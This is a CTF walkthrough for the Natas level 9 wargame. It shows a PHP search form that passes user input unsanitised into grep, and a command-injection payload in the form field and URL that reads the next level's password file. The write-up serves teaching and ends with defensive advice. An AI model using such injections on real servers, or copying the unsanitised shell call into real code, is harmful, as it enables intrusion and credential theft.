# Natas Level 8 → Level 9

**Goal:** 

Find the password for natas10. This level passes user input directly into a shell command (grep), making it vulnerable to command injection.

# Step 1: Access the level

http://natas9.natas.labs.overthewire.org

Username: natas9
Password: (from level 7)

# Step 2: Read the page

There's a form that lets you search a "dictionary", you type a word and it searches for it within a wordlist file.

# Step 3: View the PHP source code

You'll see something like:

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST['needle'];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

The $_REQUEST['needle'] value is inserted directly into a shell command via passthru(), with no sanitization. This means you can inject additional shell commands using shell metacharacters like ;, &&, or |.

# Step 4: Craft a command injection payload

Since the base command is:

`grep -i <needle> dictionary.txt`

You can break out of it and run your own command. For example, to read the password file:

`; cat /etc/natas_webpass/natas10 ;`

Or using a pipe to terminate grep cleanly:

`anything; cat /etc/natas_webpass/natas10`

# Step 5: Submit the payload

In the "needle" input field on the natas9 page, enter:

`; cat /etc/natas_webpass/natas10 ;`

Then submit the form.

(You can also do this via URL directly since it's a GET/REQUEST param:)

http://natas9.natas.labs.overthewire.org/index.php?needle=;cat+/etc/natas_webpass/natas10;

# Step 6: Get the password

The output will include the grep results (likely empty/error) plus the contents of the password file:

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

*Lesson learned*

Passing user input directly into shell commands (via passthru, exec, system, shell_exec, etc.) is extremely dangerous. It allows attackers to inject and execute arbitrary commands on the server. User input should never be concatenated into shell commands; use parameterized/escaped functions (like escapeshellarg()) or, better, avoid shelling out entirely when possible.